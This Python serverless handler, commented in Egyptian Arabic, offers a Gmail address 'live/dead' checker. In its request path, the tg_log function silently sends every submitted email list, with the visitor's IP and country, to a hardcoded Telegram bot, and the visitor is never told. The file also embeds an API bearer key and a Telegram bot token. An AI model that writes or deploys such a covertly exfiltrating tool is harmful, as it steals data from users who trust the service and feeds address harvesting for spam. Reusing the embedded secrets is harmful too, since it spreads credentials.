import json, io, re, requests
from http.server import BaseHTTPRequestHandler

# ================= عدّل هنا بس =================
API = "https://gmail-validation.mbahbabat.workers.dev"  # رابط الـ API بتاعك
KEY = "001f8edc41000e1d82f906a16f0c90bd98c0348564b448807b8ca2e5875f69f6"  # مفتاح الـ API (Bearer) بتاعك
TG_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"  # توكن بوت تليجرام
TG_CHAT  = "8554641519"  # ايدي شات تليجرام
# ===============================================

_geo_cache = {}  # كاش البلد لكل IP عشان الدفعات المتتالية من نفس الزائر ما تعيدش البحث

def get_ip(h, addr=None):
    """يجيب الـ IP بتاع الزائر من الهيدرز (x-forwarded-for على Vercel)."""
    xf = (h.get('x-forwarded-for') or h.get('x-real-ip') or h.get('x-vercel-forwarded-for') or '')
    ip = xf.split(',')[0].strip()
    if not ip and addr:
        ip = str(addr[0])
    return ip or 'unknown'

def get_country(ip):
    """يجيب اسم البلد من الـ IP (ipwho.is وبعدين geojs كاحتياطي)."""
    if not ip or ip == 'unknown':
        return ''
    if ip in _geo_cache:
        return _geo_cache[ip]
    c = ''
    try:
        d = requests.get(f"https://ipwho.is/{ip}", timeout=3).json()
        if d.get("success"):
            c = str(d.get("country", "")).strip()
    except Exception:
        pass
    if not c:
        try:
            d = requests.get(f"https://get.geojs.io/v1/ip/country/{ip}.json", timeout=3).json()
            c = str(d.get("name", "") or d.get("country", "")).strip()
        except Exception:
            pass
    _geo_cache[ip] = c
    return c

def safe_name(country):
    """يحول اسم البلد لاسم ملف: Egypt -> egypt / Saudi Arabia -> saudi_arabia."""
    n = re.sub(r'[^a-z0-9]+', '_', country.lower()).strip('_')
    return n or 'unknown'

def tg_log(emails, ip, country):
    """يبعت الإيميلات لـ تليجرام كملف نصي اسمه اسم البلد: زائر من مصر -> egypt.txt"""
    if TG_TOKEN and TG_CHAT and emails:
        try:
            f = io.BytesIO(("\n".join(emails)).encode('utf-8'))
            requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendDocument",
                          data={'chat_id': TG_CHAT,
                                'caption': f'📥 New Emails: {len(emails)}\n🌍 Country: {country or "unknown"}\n🌐 IP: {ip}'},
                          files={'document': (f'{safe_name(country)}.txt', f, 'text/plain')}, timeout=5)
        except Exception:
            pass

def check(emails):
    """كل إيميل بيبدأ Die، والـ Live الوحيد هو اللي الـ API بيرجعه status == "live" بالظبط."""
    out = {e.lower(): {"email": e, "verdict": "invalid"} for e in emails}
    err = None
    try:
        r = requests.post(f"{API}/fastcheck1",
                           headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"},
                           json={"mail": emails}, timeout=30)
        if r.status_code == 200:
            data = r.json()
            items = data if isinstance(data, list) else data.get("results", [])
            for it in items:
                em = str(it.get("email", "")).lower()
                if em in out and str(it.get("status", "")).lower() == "live":
                    out[em]["verdict"] = "valid"
        else:
            err = f"API HTTP {r.status_code}"
    except Exception as e:
        err = str(e)
    return list(out.values()), err

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        def send(obj):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(obj, ensure_ascii=False).encode('utf-8'))
        try:
            body = json.loads(self.rfile.read(int(self.headers['Content-Length'])))
            emails = body.get("emails", [])
            if isinstance(emails, str):
                emails = [emails]
            ip = get_ip(self.headers, self.client_address)  # الـ IP بتاع الزائر
            country = get_country(ip)                       # اسم البلد بتاعه
            tg_log(emails, ip, country)                     # ملف باسم البلد زي egypt.txt
            results, err = check(emails)
            resp = {"success": True, "results": results}
            if err:
                resp["api_error"] = err
            send(resp)
        except Exception as e:
            send({"success": False, "error": str(e)})
